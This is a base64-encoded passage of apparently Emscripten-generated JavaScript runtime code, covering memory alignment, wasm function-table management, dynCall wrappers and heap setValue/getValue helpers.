Q1RPUF9QVFI+PjJdID0gZW5kOw0KICByZXR1cm4gcmV0Ow0KfQ0KDQpmdW5jdGlvbiBhbGlnbk1lbW9yeShzaXplLCBmYWN0b3IpIHsNCiAgaWYgKCFmYWN0b3IpIGZhY3RvciA9IFNUQUNLX0FMSUdOOyAvLyBzdGFjayBhbGlnbm1lbnQgKDE2LWJ5dGUpIGJ5IGRlZmF1bHQNCiAgcmV0dXJuIE1hdGguY2VpbChzaXplIC8gZmFjdG9yKSAqIGZhY3RvcjsNCn0NCg0KZnVuY3Rpb24gZ2V0TmF0aXZlVHlwZVNpemUodHlwZSkgew0KICBzd2l0Y2ggKHR5cGUpIHsNCiAgICBjYXNlICdpMSc6IGNhc2UgJ2k4JzogcmV0dXJuIDE7DQogICAgY2FzZSAnaTE2JzogcmV0dXJuIDI7DQogICAgY2FzZSAnaTMyJzogcmV0dXJuIDQ7DQogICAgY2FzZSAnaTY0JzogcmV0dXJuIDg7DQogICAgY2FzZSAnZmxvYXQnOiByZXR1cm4gNDsNCiAgICBjYXNlICdkb3VibGUnOiByZXR1cm4gODsNCiAgICBkZWZhdWx0OiB7DQogICAgICBpZiAodHlwZVt0eXBlLmxlbmd0aC0xXSA9PT0gJyonKSB7DQogICAgICAgIHJldHVybiA0OyAvLyBBIHBvaW50ZXINCiAgICAgIH0gZWxzZSBpZiAodHlwZVswXSA9PT0gJ2knKSB7DQogICAgICAgIHZhciBiaXRzID0gTnVtYmVyKHR5cGUuc3Vic3RyKDEpKTsNCiAgICAgICAgYXNzZXJ0KGJpdHMgJSA4ID09PSAwLCAnZ2V0TmF0aXZlVHlwZVNpemUgaW52YWxpZCBiaXRzICcgKyBiaXRzICsgJywgdHlwZSAnICsgdHlwZSk7DQogICAgICAgIHJldHVybiBiaXRzIC8gODsNCiAgICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KfQ0KDQpmdW5jdGlvbiB3YXJuT25jZSh0ZXh0KSB7DQogIGlmICghd2Fybk9uY2Uuc2hvd24pIHdhcm5PbmNlLnNob3duID0ge307DQogIGlmICghd2Fybk9uY2Uuc2hvd25bdGV4dF0pIHsNCiAgICB3YXJuT25jZS5zaG93blt0ZXh0XSA9IDE7DQogICAgZXJyKHRleHQpOw0KICB9DQp9DQoNCg0KDQoNCg0KDQoNCg0KLy8gV3JhcHMgYSBKUyBmdW5jdGlvbiBhcyBhIHdhc20gZnVuY3Rpb24gd2l0aCBhIGdpdmVuIHNpZ25hdHVyZS4NCmZ1bmN0aW9uIGNvbnZlcnRKc0Z1bmN0aW9uVG9XYXNtKGZ1bmMsIHNpZykgew0KDQogIC8vIElmIHRoZSB0eXBlIHJlZmxlY3Rpb24gcHJvcG9zYWwgaXMgYXZhaWxhYmxlLCB1c2UgdGhlIG5ldw0KICAvLyAiV2ViQXNzZW1ibHkuRnVuY3Rpb24iIGNvbnN0cnVjdG9yLg0KICAvLyBPdGhlcndpc2UsIGNvbnN0cnVjdCBhIG1pbmltYWwgd2FzbSBtb2R1bGUgaW1wb3J0aW5nIHRoZSBKUyBmdW5jdGlvbiBhbmQNCiAgLy8gcmUtZXhwb3J0aW5nIGl0Lg0KICBpZiAodHlwZW9mIFdlYkFzc2VtYmx5LkZ1bmN0aW9uID09PSAiZnVuY3Rpb24iKSB7DQogICAgdmFyIHR5cGVOYW1lcyA9IHsNCiAgICAgICdpJzogJ2kzMicsDQogICAgICAnaic6ICdpNjQnLA0KICAgICAgJ2YnOiAnZjMyJywNCiAgICAgICdkJzogJ2Y2NCcNCiAgICB9Ow0KICAgIHZhciB0eXBlID0gew0KICAgICAgcGFyYW1ldGVyczogW10sDQogICAgICByZXN1bHRzOiBzaWdbMF0gPT0gJ3YnID8gW10gOiBbdHlwZU5hbWVzW3NpZ1swXV1dDQogICAgfTsNCiAgICBmb3IgKHZhciBpID0gMTsgaSA8IHNpZy5sZW5ndGg7ICsraSkgew0KICAgICAgdHlwZS5wYXJhbWV0ZXJzLnB1c2godHlwZU5hbWVzW3NpZ1tpXV0pOw0KICAgIH0NCiAgICByZXR1cm4gbmV3IFdlYkFzc2VtYmx5LkZ1bmN0aW9uKHR5cGUsIGZ1bmMpOw0KICB9DQoNCiAgLy8gVGhlIG1vZHVsZSBpcyBzdGF0aWMsIHdpdGggdGhlIGV4Y2VwdGlvbiBvZiB0aGUgdHlwZSBzZWN0aW9uLCB3aGljaCBpcw0KICAvLyBnZW5lcmF0ZWQgYmFzZWQgb24gdGhlIHNpZ25hdHVyZSBwYXNzZWQgaW4uDQogIHZhciB0eXBlU2VjdGlvbiA9IFsNCiAgICAweDAxLCAvLyBpZDogc2VjdGlvbiwNCiAgICAweDAwLCAvLyBsZW5ndGg6IDAgKHBsYWNlaG9sZGVyKQ0KICAgIDB4MDEsIC8vIGNvdW50OiAxDQogICAgMHg2MCwgLy8gZm9ybTogZnVuYw0KICBdOw0KICB2YXIgc2lnUmV0ID0gc2lnLnNsaWNlKDAsIDEpOw0KICB2YXIgc2lnUGFyYW0gPSBzaWcuc2xpY2UoMSk7DQogIHZhciB0eXBlQ29kZXMgPSB7DQogICAgJ2knOiAweDdmLCAvLyBpMzINCiAgICAnaic6IDB4N2UsIC8vIGk2NA0KICAgICdmJzogMHg3ZCwgLy8gZjMyDQogICAgJ2QnOiAweDdjLCAvLyBmNjQNCiAgfTsNCg0KICAvLyBQYXJhbWV0ZXJzLCBsZW5ndGggKyBzaWduYXR1cmVzDQogIHR5cGVTZWN0aW9uLnB1c2goc2lnUGFyYW0ubGVuZ3RoKTsNCiAgZm9yICh2YXIgaSA9IDA7IGkgPCBzaWdQYXJhbS5sZW5ndGg7ICsraSkgew0KICAgIHR5cGVTZWN0aW9uLnB1c2godHlwZUNvZGVzW3NpZ1BhcmFtW2ldXSk7DQogIH0NCg0KICAvLyBSZXR1cm4gdmFsdWVzLCBsZW5ndGggKyBzaWduYXR1cmVzDQogIC8vIFdpdGggbm8gbXVsdGktcmV0dXJuIGluIE1WUCwgZWl0aGVyIDAgKHZvaWQpIG9yIDEgKGFueXRoaW5nIGVsc2UpDQogIGlmIChzaWdSZXQgPT0gJ3YnKSB7DQogICAgdHlwZVNlY3Rpb24ucHVzaCgweDAwKTsNCiAgfSBlbHNlIHsNCiAgICB0eXBlU2VjdGlvbiA9IHR5cGVTZWN0aW9uLmNvbmNhdChbMHgwMSwgdHlwZUNvZGVzW3NpZ1JldF1dKTsNCiAgfQ0KDQogIC8vIFdyaXRlIHRoZSBvdmVyYWxsIGxlbmd0aCBvZiB0aGUgdHlwZSBzZWN0aW9uIGJhY2sgaW50byB0aGUgc2VjdGlvbiBoZWFkZXINCiAgLy8gKGV4Y2VwdGluZyB0aGUgMiBieXRlcyBmb3IgdGhlIHNlY3Rpb24gaWQgYW5kIGxlbmd0aCkNCiAgdHlwZVNlY3Rpb25bMV0gPSB0eXBlU2VjdGlvbi5sZW5ndGggLSAyOw0KDQogIC8vIFJlc3Qgb2YgdGhlIG1vZHVsZSBpcyBzdGF0aWMNCiAgdmFyIGJ5dGVzID0gbmV3IFVpbnQ4QXJyYXkoWw0KICAgIDB4MDAsIDB4NjEsIDB4NzMsIDB4NmQsIC8vIG1hZ2ljICgiXDBhc20iKQ0KICAgIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIC8vIHZlcnNpb246IDENCiAgXS5jb25jYXQodHlwZVNlY3Rpb24sIFsNCiAgICAweDAyLCAweDA3LCAvLyBpbXBvcnQgc2VjdGlvbg0KICAgICAgLy8gKGltcG9ydCAiZSIgImYiIChmdW5jIDAgKHR5cGUgMCkpKQ0KICAgICAgMHgwMSwgMHgwMSwgMHg2NSwgMHgwMSwgMHg2NiwgMHgwMCwgMHgwMCwNCiAgICAweDA3LCAweDA1LCAvLyBleHBvcnQgc2VjdGlvbg0KICAgICAgLy8gKGV4cG9ydCAiZiIgKGZ1bmMgMCAodHlwZSAwKSkpDQogICAgICAweDAxLCAweDAxLCAweDY2LCAweDAwLCAweDAwLA0KICBdKSk7DQoNCiAgIC8vIFdlIGNhbiBjb21waWxlIHRoaXMgd2FzbSBtb2R1bGUgc3luY2hyb25vdXNseSBiZWNhdXNlIGl0IGlzIHZlcnkgc21hbGwuDQogIC8vIFRoaXMgYWNjZXB0cyBhbiBpbXBvcnQgKGF0ICJlLmYiKSwgdGhhdCBpdCByZXJvdXRlcyB0byBhbiBleHBvcnQgKGF0ICJmIikNCiAgdmFyIG1vZHVsZSA9IG5ldyBXZWJBc3NlbWJseS5Nb2R1bGUoYnl0ZXMpOw0KICB2YXIgaW5zdGFuY2UgPSBuZXcgV2ViQXNzZW1ibHkuSW5zdGFuY2UobW9kdWxlLCB7DQogICAgJ2UnOiB7DQogICAgICAnZic6IGZ1bmMNCiAgICB9DQogIH0pOw0KICB2YXIgd3JhcHBlZEZ1bmMgPSBpbnN0YW5jZS5leHBvcnRzWydmJ107DQogIHJldHVybiB3cmFwcGVkRnVuYzsNCn0NCg0KdmFyIGZyZWVUYWJsZUluZGV4ZXMgPSBbXTsNCg0KLy8gV2VhayBtYXAgb2YgZnVuY3Rpb25zIGluIHRoZSB0YWJsZSB0byB0aGVpciBpbmRleGVzLCBjcmVhdGVkIG9uIGZpcnN0IHVzZS4NCnZhciBmdW5jdGlvbnNJblRhYmxlTWFwOw0KDQovLyBBZGQgYSB3YXNtIGZ1bmN0aW9uIHRvIHRoZSB0YWJsZS4NCmZ1bmN0aW9uIGFkZEZ1bmN0aW9uV2FzbShmdW5jLCBzaWcpIHsNCiAgdmFyIHRhYmxlID0gd2FzbVRhYmxlOw0KDQogIC8vIENoZWNrIGlmIHRoZSBmdW5jdGlvbiBpcyBhbHJlYWR5IGluIHRoZSB0YWJsZSwgdG8gZW5zdXJlIGVhY2ggZnVuY3Rpb24NCiAgLy8gZ2V0cyBhIHVuaXF1ZSBpbmRleC4gRmlyc3QsIGNyZWF0ZSB0aGUgbWFwIGlmIHRoaXMgaXMgdGhlIGZpcnN0IHVzZS4NCiAgaWYgKCFmdW5jdGlvbnNJblRhYmxlTWFwKSB7DQogICAgZnVuY3Rpb25zSW5UYWJsZU1hcCA9IG5ldyBXZWFrTWFwKCk7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0YWJsZS5sZW5ndGg7IGkrKykgew0KICAgICAgdmFyIGl0ZW0gPSB0YWJsZS5nZXQoaSk7DQogICAgICAvLyBJZ25vcmUgbnVsbCB2YWx1ZXMuDQogICAgICBpZiAoaXRlbSkgew0KICAgICAgICBmdW5jdGlvbnNJblRhYmxlTWFwLnNldChpdGVtLCBpKTsNCiAgICAgIH0NCiAgICB9DQogIH0NCiAgaWYgKGZ1bmN0aW9uc0luVGFibGVNYXAuaGFzKGZ1bmMpKSB7DQogICAgcmV0dXJuIGZ1bmN0aW9uc0luVGFibGVNYXAuZ2V0KGZ1bmMpOw0KICB9DQoNCiAgLy8gSXQncyBub3QgaW4gdGhlIHRhYmxlLCBhZGQgaXQgbm93Lg0KDQoNCiAgdmFyIHJldDsNCiAgLy8gUmV1c2UgYSBmcmVlIGluZGV4IGlmIHRoZXJlIGlzIG9uZSwgb3RoZXJ3aXNlIGdyb3cuDQogIGlmIChmcmVlVGFibGVJbmRleGVzLmxlbmd0aCkgew0KICAgIHJldCA9IGZyZWVUYWJsZUluZGV4ZXMucG9wKCk7DQogIH0gZWxzZSB7DQogICAgcmV0ID0gdGFibGUubGVuZ3RoOw0KICAgIC8vIEdyb3cgdGhlIHRhYmxlDQogICAgdHJ5IHsNCiAgICAgIHRhYmxlLmdyb3coMSk7DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICBpZiAoIShlcnIgaW5zdGFuY2VvZiBSYW5nZUVycm9yKSkgew0KICAgICAgICB0aHJvdyBlcnI7DQogICAgICB9DQogICAgICB0aHJvdyAnVW5hYmxlIHRvIGdyb3cgd2FzbSB0YWJsZS4gU2V0IEFMTE9XX1RBQkxFX0dST1dUSC4nOw0KICAgIH0NCiAgfQ0KDQogIC8vIFNldCB0aGUgbmV3IHZhbHVlLg0KICB0cnkgew0KICAgIC8vIEF0dGVtcHRpbmcgdG8gY2FsbCB0aGlzIHdpdGggSlMgZnVuY3Rpb24gd2lsbCBjYXVzZSBvZiB0YWJsZS5zZXQoKSB0byBmYWlsDQogICAgdGFibGUuc2V0KHJldCwgZnVuYyk7DQogIH0gY2F0Y2ggKGVycikgew0KICAgIGlmICghKGVyciBpbnN0YW5jZW9mIFR5cGVFcnJvcikpIHsNCiAgICAgIHRocm93IGVycjsNCiAgICB9DQogICAgYXNzZXJ0KHR5cGVvZiBzaWcgIT09ICd1bmRlZmluZWQnLCAnTWlzc2luZyBzaWduYXR1cmUgYXJndW1lbnQgdG8gYWRkRnVuY3Rpb24nKTsNCiAgICB2YXIgd3JhcHBlZCA9IGNvbnZlcnRKc0Z1bmN0aW9uVG9XYXNtKGZ1bmMsIHNpZyk7DQogICAgdGFibGUuc2V0KHJldCwgd3JhcHBlZCk7DQogIH0NCg0KICBmdW5jdGlvbnNJblRhYmxlTWFwLnNldChmdW5jLCByZXQpOw0KDQogIHJldHVybiByZXQ7DQp9DQoNCmZ1bmN0aW9uIHJlbW92ZUZ1bmN0aW9uV2FzbShpbmRleCkgew0KICBmdW5jdGlvbnNJblRhYmxlTWFwLmRlbGV0ZSh3YXNtVGFibGUuZ2V0KGluZGV4KSk7DQogIGZyZWVUYWJsZUluZGV4ZXMucHVzaChpbmRleCk7DQp9DQoNCi8vICdzaWcnIHBhcmFtZXRlciBpcyByZXF1aXJlZCBmb3IgdGhlIGxsdm0gYmFja2VuZCBidXQgb25seSB3aGVuIGZ1bmMgaXMgbm90DQovLyBhbHJlYWR5IGEgV2ViQXNzZW1ibHkgZnVuY3Rpb24uDQpmdW5jdGlvbiBhZGRGdW5jdGlvbihmdW5jLCBzaWcpIHsNCiAgYXNzZXJ0KHR5cGVvZiBmdW5jICE9PSAndW5kZWZpbmVkJyk7DQoNCiAgcmV0dXJuIGFkZEZ1bmN0aW9uV2FzbShmdW5jLCBzaWcpOw0KfQ0KDQpmdW5jdGlvbiByZW1vdmVGdW5jdGlvbihpbmRleCkgew0KICByZW1vdmVGdW5jdGlvbldhc20oaW5kZXgpOw0KfQ0KDQoNCg0KdmFyIGZ1bmNXcmFwcGVycyA9IHt9Ow0KDQpmdW5jdGlvbiBnZXRGdW5jV3JhcHBlcihmdW5jLCBzaWcpIHsNCiAgaWYgKCFmdW5jKSByZXR1cm47IC8vIG9uIG51bGwgcG9pbnRlciwgcmV0dXJuIHVuZGVmaW5lZA0KICBhc3NlcnQoc2lnKTsNCiAgaWYgKCFmdW5jV3JhcHBlcnNbc2lnXSkgew0KICAgIGZ1bmNXcmFwcGVyc1tzaWddID0ge307DQogIH0NCiAgdmFyIHNpZ0NhY2hlID0gZnVuY1dyYXBwZXJzW3NpZ107DQogIGlmICghc2lnQ2FjaGVbZnVuY10pIHsNCiAgICAvLyBvcHRpbWl6ZSBhd2F5IGFyZ3VtZW50cyB1c2FnZSBpbiBjb21tb24gY2FzZXMNCiAgICBpZiAoc2lnLmxlbmd0aCA9PT0gMSkgew0KICAgICAgc2lnQ2FjaGVbZnVuY10gPSBmdW5jdGlvbiBkeW5DYWxsX3dyYXBwZXIoKSB7DQogICAgICAgIHJldHVybiBkeW5DYWxsKHNpZywgZnVuYyk7DQogICAgICB9Ow0KICAgIH0gZWxzZSBpZiAoc2lnLmxlbmd0aCA9PT0gMikgew0KICAgICAgc2lnQ2FjaGVbZnVuY10gPSBmdW5jdGlvbiBkeW5DYWxsX3dyYXBwZXIoYXJnKSB7DQogICAgICAgIHJldHVybiBkeW5DYWxsKHNpZywgZnVuYywgW2FyZ10pOw0KICAgICAgfTsNCiAgICB9IGVsc2Ugew0KICAgICAgLy8gZ2VuZXJhbCBjYXNlDQogICAgICBzaWdDYWNoZVtmdW5jXSA9IGZ1bmN0aW9uIGR5bkNhbGxfd3JhcHBlcigpIHsNCiAgICAgICAgcmV0dXJuIGR5bkNhbGwoc2lnLCBmdW5jLCBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMpKTsNCiAgICAgIH07DQogICAgfQ0KICB9DQogIHJldHVybiBzaWdDYWNoZVtmdW5jXTsNCn0NCg0KDQoNCg0KDQoNCg0KZnVuY3Rpb24gbWFrZUJpZ0ludChsb3csIGhpZ2gsIHVuc2lnbmVkKSB7DQogIHJldHVybiB1bnNpZ25lZCA/ICgoKygobG93Pj4+MCkpKSsoKCsoKGhpZ2g+Pj4wKSkpKjQyOTQ5NjcyOTYuMCkpIDogKCgrKChsb3c+Pj4wKSkpKygoKygoaGlnaHwwKSkpKjQyOTQ5NjcyOTYuMCkpOw0KfQ0KDQovKiogQHBhcmFtIHtBcnJheT19IGFyZ3MgKi8NCmZ1bmN0aW9uIGR5bkNhbGwoc2lnLCBwdHIsIGFyZ3MpIHsNCiAgaWYgKGFyZ3MgJiYgYXJncy5sZW5ndGgpIHsNCiAgICAvLyBqICg2NC1iaXQgaW50ZWdlcikgbXVzdCBiZSBwYXNzZWQgaW4gYXMgdHdvIG51bWJlcnMgW2xvdyAzMiwgaGlnaCAzMl0uDQogICAgYXNzZXJ0KGFyZ3MubGVuZ3RoID09PSBzaWcuc3Vic3RyaW5nKDEpLnJlcGxhY2UoL2ovZywgJy0tJykubGVuZ3RoKTsNCiAgICBhc3NlcnQoKCdkeW5DYWxsXycgKyBzaWcpIGluIE1vZHVsZSwgJ2JhZCBmdW5jdGlvbiBwb2ludGVyIHR5cGUgLSBubyB0YWJsZSBmb3Igc2lnIFwnJyArIHNpZyArICdcJycpOw0KICAgIHJldHVybiBNb2R1bGVbJ2R5bkNhbGxfJyArIHNpZ10uYXBwbHkobnVsbCwgW3B0cl0uY29uY2F0KGFyZ3MpKTsNCiAgfSBlbHNlIHsNCiAgICBhc3NlcnQoc2lnLmxlbmd0aCA9PSAxKTsNCiAgICBhc3NlcnQoKCdkeW5DYWxsXycgKyBzaWcpIGluIE1vZHVsZSwgJ2JhZCBmdW5jdGlvbiBwb2ludGVyIHR5cGUgLSBubyB0YWJsZSBmb3Igc2lnIFwnJyArIHNpZyArICdcJycpOw0KICAgIHJldHVybiBNb2R1bGVbJ2R5bkNhbGxfJyArIHNpZ10uY2FsbChudWxsLCBwdHIpOw0KICB9DQp9DQoNCnZhciB0ZW1wUmV0MCA9IDA7DQoNCnZhciBzZXRUZW1wUmV0MCA9IGZ1bmN0aW9uKHZhbHVlKSB7DQogIHRlbXBSZXQwID0gdmFsdWU7DQp9Ow0KDQp2YXIgZ2V0VGVtcFJldDAgPSBmdW5jdGlvbigpIHsNCiAgcmV0dXJuIHRlbXBSZXQwOw0KfTsNCg0KZnVuY3Rpb24gZ2V0Q29tcGlsZXJTZXR0aW5nKG5hbWUpIHsNCiAgdGhyb3cgJ1lvdSBtdXN0IGJ1aWxkIHdpdGggLXMgUkVUQUlOX0NPTVBJTEVSX1NFVFRJTkdTPTEgZm9yIGdldENvbXBpbGVyU2V0dGluZyBvciBlbXNjcmlwdGVuX2dldF9jb21waWxlcl9zZXR0aW5nIHRvIHdvcmsnOw0KfQ0KDQovLyBUaGUgYWRkcmVzcyBnbG9iYWxzIGJlZ2luIGF0LiBWZXJ5IGxvdyBpbiBtZW1vcnksIGZvciBjb2RlIHNpemUgYW5kIG9wdGltaXphdGlvbiBvcHBvcnR1bml0aWVzLg0KLy8gQWJvdmUgMCBpcyBzdGF0aWMgbWVtb3J5LCBzdGFydGluZyB3aXRoIGdsb2JhbHMuDQovLyBUaGVuIHRoZSBzdGFjay4NCi8vIFRoZW4gJ2R5bmFtaWMnIG1lbW9yeSBmb3Igc2Jyay4NCnZhciBHTE9CQUxfQkFTRSA9IDEwMjQ7DQoNCg0KDQoNCg0KLy8gPT09IFByZWFtYmxlIGxpYnJhcnkgc3R1ZmYgPT09DQoNCi8vIERvY3VtZW50YXRpb24gZm9yIHRoZSBwdWJsaWMgQVBJcyBkZWZpbmVkIGluIHRoaXMgZmlsZSBtdXN0IGJlIHVwZGF0ZWQgaW46DQovLyAgICBzaXRlL3NvdXJjZS9kb2NzL2FwaV9yZWZlcmVuY2UvcHJlYW1ibGUuanMucnN0DQovLyBBIHByZWJ1aWx0IGxvY2FsIHZlcnNpb24gb2YgdGhlIGRvY3VtZW50YXRpb24gaXMgYXZhaWxhYmxlIGF0Og0KLy8gICAgc2l0ZS9idWlsZC90ZXh0L2RvY3MvYXBpX3JlZmVyZW5jZS9wcmVhbWJsZS5qcy50eHQNCi8vIFlvdSBjYW4gYWxzbyBidWlsZCBkb2NzIGxvY2FsbHkgYXMgSFRNTCBvciBvdGhlciBmb3JtYXRzIGluIHNpdGUvDQovLyBBbiBvbmxpbmUgSFRNTCB2ZXJzaW9uICh3aGljaCBtYXkgYmUgb2YgYSBkaWZmZXJlbnQgdmVyc2lvbiBvZiBFbXNjcmlwdGVuKQ0KLy8gICAgaXMgdXAgYXQgaHR0cDovL2tyaXBrZW4uZ2l0aHViLmlvL2Vtc2NyaXB0ZW4tc2l0ZS9kb2NzL2FwaV9yZWZlcmVuY2UvcHJlYW1ibGUuanMuaHRtbA0KDQoNCnZhciB3YXNtQmluYXJ5O2lmIChNb2R1bGVbJ3dhc21CaW5hcnknXSkgd2FzbUJpbmFyeSA9IE1vZHVsZVsnd2FzbUJpbmFyeSddO2lmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICd3YXNtQmluYXJ5JykpIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShNb2R1bGUsICd3YXNtQmluYXJ5JywgeyBjb25maWd1cmFibGU6IHRydWUsIGdldDogZnVuY3Rpb24oKSB7IGFib3J0KCdNb2R1bGUud2FzbUJpbmFyeSBoYXMgYmVlbiByZXBsYWNlZCB3aXRoIHBsYWluIHdhc21CaW5hcnkgKHRoZSBpbml0aWFsIHZhbHVlIGNhbiBiZSBwcm92aWRlZCBvbiBNb2R1bGUsIGJ1dCBhZnRlciBzdGFydHVwIHRoZSB2YWx1ZSBpcyBvbmx5IGxvb2tlZCBmb3Igb24gYSBsb2NhbCB2YXJpYWJsZSBvZiB0aGF0IG5hbWUpJykgfSB9KTsNCnZhciBub0V4aXRSdW50aW1lO2lmIChNb2R1bGVbJ25vRXhpdFJ1bnRpbWUnXSkgbm9FeGl0UnVudGltZSA9IE1vZHVsZVsnbm9FeGl0UnVudGltZSddO2lmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICdub0V4aXRSdW50aW1lJykpIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShNb2R1bGUsICdub0V4aXRSdW50aW1lJywgeyBjb25maWd1cmFibGU6IHRydWUsIGdldDogZnVuY3Rpb24oKSB7IGFib3J0KCdNb2R1bGUubm9FeGl0UnVudGltZSBoYXMgYmVlbiByZXBsYWNlZCB3aXRoIHBsYWluIG5vRXhpdFJ1bnRpbWUgKHRoZSBpbml0aWFsIHZhbHVlIGNhbiBiZSBwcm92aWRlZCBvbiBNb2R1bGUsIGJ1dCBhZnRlciBzdGFydHVwIHRoZSB2YWx1ZSBpcyBvbmx5IGxvb2tlZCBmb3Igb24gYSBsb2NhbCB2YXJpYWJsZSBvZiB0aGF0IG5hbWUpJykgfSB9KTsNCg0KDQppZiAodHlwZW9mIFdlYkFzc2VtYmx5ICE9PSAnb2JqZWN0Jykgew0KICBhYm9ydCgnTm8gV2ViQXNzZW1ibHkgc3VwcG9ydCBmb3VuZC4gQnVpbGQgd2l0aCAtcyBXQVNNPTAgdG8gdGFyZ2V0IEphdmFTY3JpcHQgaW5zdGVhZC4nKTsNCn0NCg0KDQoNCg0KLy8gSW4gTUlOSU1BTF9SVU5USU1FLCBzZXRWYWx1ZSgpIGFuZCBnZXRWYWx1ZSgpIGFyZSBvbmx5IGF2YWlsYWJsZSB3aGVuIGJ1aWxkaW5nIHdpdGggc2FmZSBoZWFwIGVuYWJsZWQsIGZvciBoZWFwIHNhZmV0eSBjaGVja2luZy4NCi8vIEluIHRyYWRpdGlvbmFsIHJ1bnRpbWUsIHNldFZhbHVlKCkgYW5kIGdldFZhbHVlKCkgYXJlIGFsd2F5cyBhdmFpbGFibGUgKGFsdGhvdWdoIHRoZWlyIHVzZSBpcyBoaWdobHkgZGlzY291cmFnZWQgZHVlIHRvIHBlcmYgcGVuYWx0aWVzKQ0KDQovKiogQHBhcmFtIHtudW1iZXJ9IHB0cg0KICAgIEBwYXJhbSB7bnVtYmVyfSB2YWx1ZQ0KICAgIEBwYXJhbSB7c3RyaW5nfSB0eXBlDQogICAgQHBhcmFtIHtudW1iZXJ8Ym9vbGVhbj19IG5vU2FmZSAqLw0KZnVuY3Rpb24gc2V0VmFsdWUocHRyLCB2YWx1ZSwgdHlwZSwgbm9TYWZlKSB7DQogIHR5cGUgPSB0eXBlIHx8ICdpOCc7DQogIGlmICh0eXBlLmNoYXJBdCh0eXBlLmxlbmd0aC0xKSA9PT0gJyonKSB0eXBlID0gJ2kzMic7IC8vIHBvaW50ZXJzIGFyZSAzMi1iaXQNCiAgICBzd2l0Y2godHlwZSkgew0KICAgICAgY2FzZSAnaTEnOiBIRUFQOFsoKHB0cik+PjApXT12YWx1ZTsgYnJlYWs7DQogICAgICBjYXNlICdpOCc6IEhFQVA4WygocHRyKT4+MCldPXZhbHVlOyBicmVhazsNCiAgICAgIGNhc2UgJ2kxNic6IEhFQVAxNlsoKHB0cik+PjEpXT12YWx1ZTsgYnJlYWs7DQogICAgICBjYXNlICdpMzInOiBIRUFQMzJbKChwdHIpPj4yKV09dmFsdWU7IGJyZWFrOw0KICAgICAgY2FzZSAnaTY0JzogKHRlbXBJNjQgPSBbdmFsdWU+Pj4wLCh0ZW1wRG91YmxlPXZhbHVlLCgrKE1hdGhfYWJzKHRlbXBEb3VibGUpKSkgPj0gMS4wID8gKHRlbXBEb3VibGUgPiAwLjAgPyAoKE1hdGhfbWluKCgrKE1hdGhfZmxvb3IoKHRlbXBEb3VibGUpLzQyOTQ5NjcyOTYuMCkpKSwgNDI5NDk2NzI5NS4wKSl8MCk+Pj4wIDogKH5+KCgrKE1hdGhfY2VpbCgodGVtcERvdWJsZSAtICsoKCh+fih0ZW1wRG91YmxlKSkpPj4+MCkpLzQyOTQ5NjcyOTYuMCkpKSkpPj4+MCkgOiAwKV0sSEVBUDMyWygocHRyKT4+MildPXRlbXBJNjRbMF0sSEVBUDMyWygoKHB0cikrKDQpKT4+MildPXRlbXBJNjRbMV0pOyBicmVhazsNCiAgICAgIGNhc2UgJ2Zsb2F0JzogSEVBUEYzMlsoKHB0cik+PjIpXT12YWx1ZTsgYnJlYWs7DQogICAgICBjYXNlICdkb3VibGUnOiBIRUFQRjY0WygocHRyKT4+MyldPXZhbHVlOyBicmVhazsNCiAgICAgIGRlZmF1bHQ6IGFib3J0KCdpbnZhbGlkIHR5cGUgZm9yIHNldFZhbHVlOiAnICsgdHlwZSk7DQogICAgfQ0KfQ0KDQovKiogQHBhcmFtIHtudW1iZXJ9IHB0cg0KICAgIEBwYXJhbSB7c3RyaW5nfSB0eXBlDQogICAgQHBhcmFtIHtudW1iZXJ8Ym9vbGVhbj19IG5vU2FmZSAqLw0KZnVuY3Rpb24gZ2V0VmFsdWUocHRyLCB0eXBlLCBub1NhZmUpIHsNCiAgdHlwZSA9IHR5cGUgfHwgJ2k4JzsNCiAgaWYgKHR5cGUuY2hhckF0KHR5cGUubGVuZ3RoLTEpID09PSAnKicpIHR5cGUgPSAnaTMyJzsgLy8gcG9pbnRlcnMgYXJlIDMyLWJpdA0KICAgIHN3aXRjaCh0eXBlKSB7DQogICAgICBjYXNlICdpMSc6IHJldHVybiBIRUFQOFsoKHB0cik+PjApXTsNCiAgICAgIGNhc2UgJ2k4JzogcmV0dXJuIEhFQVA4WygocHRyKT4+MCldOw0KICAgICAgY2FzZSAnaTE2JzogcmV0dXJuIEhFQVAxNlsoKHB0cik+PjEpXTsNCiAgICAgIGNhc2UgJ2kzMic6IHJldHVybiBIRUFQMzJbKChwdHIpPj4yKV07DQogICAgICBjYXNlICdpNjQnOiByZXR1cm4gSEVBUDMyWygocHRyKT4+MildOw0KICAgICAgY2FzZSAnZmxvYXQnOiByZXR1cm4gSEVBUEYzMlsoKHB0cik+PjIpXTsNCiAgICAgIGNhc2UgJ2RvdWJsZSc6IHJldHVybiBIRUFQRjY0WygocHRyKT4+MyldOw0KICAgICAgZGVmYXVsdDogYWJvcnQoJ2ludmFsaWQgdHlwZSBmb3IgZ2V0VmFsdWU6ICcgKyB0eXBlKTsNCiAgICB9DQogIHJldHVybiBudWxsOw0KfQ0KDQoNCg0KDQoNCg0KLy8gV2FzbSBnbG9iYWxzDQoNCnZhciB3YXNtTWVtb3J5Ow0KDQovLyBJbiBmYXN0Y29tcCBhc20uanMsIHdlIGRvbid0IG5lZWQgYSB3YXNtIFRhYmxlIGF0IGFsbC4NCi8vIEluIHRoZSB3YXNtIGJhY2tlbmQsIHdlIHBvbHlmaWxsIHRoZSBXZWJBc3NlbWJseSBvYmplY3QsDQovLyBzbyB0aGlzIGNyZWF0ZXMgYSAobm9uLW5hdGl2ZS13YXNtKSB0YWJsZSBmb3IgdXMuDQp2YXIgd2FzbVRhYmxlID0gbmV3IFdlYkFzc2VtYmx5LlRhYmxlKHsNCiAgJ2luaXRpYWwnOiAzNDgsDQogICdtYXhpbXVtJzogMzQ4ICsgMCwNCiAgJ2VsZW1lbnQnOiAnYW55ZnVuYycNCn0pOw0KDQoNCi8vPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KLy8gUnVudGltZSBlc3